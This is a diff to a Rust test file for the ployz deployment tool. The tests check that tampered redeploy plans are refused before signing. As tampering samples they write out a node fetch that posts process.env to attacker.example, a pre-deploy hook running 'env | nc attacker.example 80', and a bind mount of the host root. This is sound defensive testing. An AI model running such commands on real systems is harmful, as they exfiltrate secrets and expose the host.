@@ -7,18 +7,23 @@ use ployz_core::authority::github_oidc::test_support::{
     CLAIMS, JWKS, TEST_KID, keys_with_test_signer, signed_by_test_signer,
 };
 use ployz_core::authority::rule::{
-    Builder, PolicyCache, PolicyMethod, RuleEvent, RuleSource, Runner,
+    Builder, PolicyCache, PolicyMethod, RuleEvent, RuleSource, Runner, template,
 };
 use ployz_core::authority::{
     AttestKey, AutoDeployRule, BuildClaim, BuildPolicy, BuildStage, CommitAuthority, CommitSha,
-    ImageDigest, PayloadDigest, PolicyDigest, RuleId, RuleService, SignerKey, StatementDigest,
-    Timestamp,
+    ImageDigest, PolicyDigest, RuleId, RuleService, Signer, SignerKey, StatementDigest, Timestamp,
 };
 use ployz_core::{Namespace, PullPolicy, RequestedServiceSpec, SealingPublicKey, ServiceName};
-use ployz_store::{DeploymentView, ImageToken};
+use ployz_store::{
+    Actor, Admit, CreateProject, Deploy, DeploymentId, DeploymentQuery, DeploymentStatus,
+    DeploymentTargetView, DeploymentView, EnvironmentId, EnvironmentRef, ImageToken,
+    OrganizationId, ProjectId, ProjectName, SealingKey,
+};
 use serde_json::{Value, json};
 
-use super::{Checked, Facts, KeySet, Refused, TokenRefusal, approvable, check};
+use super::super::super::store::{Backend, Store, mint};
+use super::approve::Enforcing;
+use super::{Checked, Facts, KeySet, Redeploy, Refused, TokenRefusal, approvable, check};
 
 const BUILDER_SHA: &str = "1234567890abcdef1234567890abcdef12345678";
 const COMMIT: &str = "54dfcf4a46870fa09f5d5d6c965dd705c1a24e5c";
@@ -30,6 +35,10 @@ fn cluster() -> SealingPublicKey {
 
 fn attest() -> AttestKey {
     AttestKey::from_bytes([2; 32])
+}
+
+fn namespace() -> Namespace {
+    Namespace::parse("app").unwrap()
 }
 
 fn web() -> ServiceName {
@@ -64,7 +73,7 @@ fn rule(dockerfile: &str) -> AutoDeployRule {
         cluster: cluster(),
         rule: RuleId::from_bytes([0x11; 16]),
         generation: GENERATION,
-        namespace: Namespace::parse("app").unwrap(),
+        namespace: namespace(),
         machines: Vec::new(),
         source: RuleSource {
             repository_id: 1_450_985_696,
@@ -81,7 +90,7 @@ fn rule(dockerfile: &str) -> AutoDeployRule {
         },
         services: vec![RuleService {
             name: web(),
-            template: PayloadDigest::parse(&"ab".repeat(32)).unwrap(),
+            template: template(&spec("web", BUILT_TAG), &namespace()).unwrap(),
             policy: policy(dockerfile),
             secrets: None,
         }],
@@ -306,13 +315,39 @@ fn build(service: &str, commit: &str, token: &ImageToken) -> Value {
     json!({"service": service, "commit": commit, "status": "reused", "message": null, "image_token": token})
 }
 
-fn spec(name: &str, image: &str) -> RequestedServiceSpec {
-    serde_json::from_value(json!({
+/// `name` as Saved: a Node web Service with a migration, run from `image`.
+fn spec_json(name: &str, image: &str) -> Value {
+    json!({
         "name": name,
         "mode": {"mode": "replicated", "replicas": 1},
-        "container": {"image": image, "pull_policy": "missing"},
-    }))
-    .unwrap()
+        "container": {
+            "image": image,
+            "pull_policy": "missing",
+            "command": ["node", "server.js"],
+            "environment": {"NODE_ENV": "production"},
+        },
+        "ports": [{"mode": "host", "bind": {"kind": "all"}, "published_port": 8080,
+                   "container_port": 80, "transport_protocol": "tcp"}],
+        "pre_deploy": {"command": ["node", "migrate.js"]},
+    })
+}
+
+fn spec(name: &str, image: &str) -> RequestedServiceSpec {
+    serde_json::from_value(spec_json(name, image)).unwrap()
+}
+
+/// `web` from the built image with each `(path, value)` set, as Cloud might plan it.
+fn tampered(changes: &[(&[&str], Value)]) -> RequestedServiceSpec {
+    let mut json = spec_json("web", BUILT_TAG);
+    for (path, value) in changes {
+        let (last, parents) = path.split_last().unwrap();
+        let mut at = &mut json;
+        for key in parents {
+            at = &mut at[*key];
+        }
+        at[*last] = value.clone();
+    }
+    serde_json::from_value(json).unwrap()
 }
 
 /// The person redeploys `web` at the fixture commit.
@@ -324,7 +359,155 @@ fn signs(
     view: &DeploymentView,
     target: Vec<RequestedServiceSpec>,
 ) -> Result<Vec<RequestedServiceSpec>, String> {
-    approvable(view, target, &expected(), &facts(), cluster()).map_err(|error| error.to_string())
+    approvable(view, target, &namespace(), &expected(), &facts(), cluster())
+        .map_err(|error| error.to_string())
+}
+
+/// The redeploy this Device approves: `web` at the fixture commit, under the fixture rule.
+fn redeploy() -> Redeploy {
+    Redeploy {
+        signer: Signer::from_seed(&[8; 32]),
+        enforcing: Enforcing {
+            cluster: cluster(),
+            machines: Vec::new(),
+        },
+        facts: facts(),
+        expected: expected(),
+        builds: Vec::new(),
+    }
+}
+
+/// What the Device approves when the checked redeploy ships `target` in `namespace`, or
+/// why it signs nothing.
+fn approves(
+    target: Vec<RequestedServiceSpec>,
+    namespace: Namespace,
+) -> Result<Vec<ployz_core::authority::ApprovedChange>, String> {
+    let token = Built::default().token(CommitAuthority::Head);
+    let view = redeployed(json!([build("web", COMMIT, &token)]));
+    let planned = DeploymentTargetView { namespace, target };
+    let id = DeploymentId::parse("aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa").unwrap();
+    let (signed, approved) = redeploy()
+        .signed(&view, planned, &id)
+        .map_err(|error| error.to_string())?;
+    assert_eq!(signed.open().unwrap().services.len(), approved.len());
+    Ok(approved)
+}
+
+fn refused_settings(target: RequestedServiceSpec) {
+    let refused = approves(vec![target], namespace()).unwrap_err();
+    assert!(
+        refused.contains("runs web with other settings than your automatic deploy rule"),
+        "{refused}"
+    );
+}
+
+#[test]
+fn the_rules_settings_with_the_checked_image_are_signed() {
+    let approved = approves(vec![spec("web", BUILT_TAG)], namespace()).unwrap();
+    assert_eq!(approved.len(), 1);
+    assert_eq!(
+        approved[0].image,
+        format!("docker.io/ployz-build/web@{}", image())
+    );
+}
+
+#[test]
+fn cloud_swapping_the_entrypoint_and_command_of_the_genuine_image_is_refused_before_signing() {
+    refused_settings(tampered(&[
+        (&["container", "entrypoint"], json!(["node", "-e"])),
+        (
+            &["container", "command"],
+            json!([
+                "fetch('https://attacker.example', {method: 'POST', body: JSON.stringify(process.env)})"
+            ]),
+        ),
+    ]));
+}
+
+#[test]
+fn cloud_swapping_the_pre_deploy_hook_is_refused_before_signing() {
+    refused_settings(tampered(&[(
+        &["pre_deploy"],
+        json!({"command": ["sh", "-c", "env | nc attacker.example 80"]}),
+    )]));
+}
+
+#[test]
+fn cloud_changing_an_env_value_or_adding_a_mount_is_refused_before_signing() {
+    refused_settings(tampered(&[(
+        &["container", "environment", "NODE_ENV"],
+        json!("development"),
+    )]));
+    refused_settings(tampered(&[
+        (
+            &["volumes"],
+            json!([{"reference": "host", "source": {"kind": "bind", "machine_path": "/"}}]),
+        ),
+        (&["mounts"], json!([{"volume": "host", "target": "/host"}])),
+    ]));
+}
+
+#[test]
+fn a_plan_in_another_namespace_than_the_rules_is_refused_before_signing() {
+    let refused = approves(
+        vec![spec("web", BUILT_TAG)],
+        Namespace::parse("other").unwrap(),
+    )
+    .unwrap_err();
+    assert!(refused.contains("another namespace"), "{refused}");
+}
+
+#[test]
+fn a_refusal_cancels_the_redeploy_and_approves_nothing() {
+    let local = std::sync::Arc::new(
+        ployz_store::ConfigStore::open("sqlite::memory:", SealingKey::new(b"test").unwrap())
+            .unwrap(),
+    );
+    let owner = Actor::system(OrganizationId::parse("owner").unwrap());
+    local
+        .write(
+            &owner,
+            &CreateProject {
+                id: ProjectId::parse(mint()).unwrap(),
+                name: ProjectName::parse("lab").unwrap(),
+                default_environment: EnvironmentId::parse(mint()).unwrap(),
+            },
+        )
+        .unwrap();
+    // Cloud admits the redeploy but lists none of the builds the Device checked.
+    let admitted = local
+        .write(
+            &owner,
+            &Admit::Deploy(Deploy {
+                id: DeploymentId::parse(mint()).unwrap(),
+                environment: EnvironmentRef::default(),
+                services: Vec::new(),
+                version: None,
+                upload: None,
+                accept_volume_loss: Vec::new(),
+                message: None,
+                prune: false,
+                no_prune: false,
+                approval: None,
+            }),
+        )
+        .unwrap();
+    let matches = crate::cli::command()
+        .try_get_matches_from(["ployz", "deployment", "redeploy", "1"])
+        .unwrap();
+    let store = Store::for_test(
+        Backend::Local(std::sync::Arc::clone(&local), owner.clone()),
+        &matches,
+    );
+
+    let refused = redeploy().approve(&store, &admitted).unwrap_err();
+
+    assert!(refused.to_string().contains("leaves out web"), "{refused}");
+    let view = local
+        .read(&owner, &DeploymentQuery { id: admitted.id })
+        .unwrap();
+    assert_eq!(view.deployment.status, DeploymentStatus::Cancelled);
 }
 
 #[test]
